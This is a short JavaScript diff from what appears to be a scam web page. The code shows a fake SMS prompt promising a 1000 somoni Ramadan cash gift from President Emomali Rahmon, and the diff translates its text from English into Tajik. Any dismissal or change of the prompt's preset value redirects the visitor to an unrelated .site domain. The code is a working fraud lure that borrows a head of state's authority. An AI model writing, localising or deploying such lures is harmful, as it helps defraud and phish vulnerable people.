@@ -1,5 +1,5 @@
-var password = 'Tjs1000'
-password = prompt('SMS: Congratulations, your are eligible to Tjs1000 Cash Ramadan Gift From President Emomali Rahmon, click OK to activate now','Tjs1000');
-if (password != 'Tjs1000') {
+var password = '1000 сомонӣ гиред'
+password = prompt('SMS: Табрикот, шумо ҳақ доред, ки 1000 сомонӣ тӯҳфаи Рамазонро аз Президент бигиред Emomali Rahmon, OK-ро пахш кунед, то ҳозир пешниҳодро гиред','1000 сомонӣ гиред');
+if (password != '1000 сомонӣ гиред') {
     location.href ='https://www.obxrgjob.site/tajik-ramadan';
 }
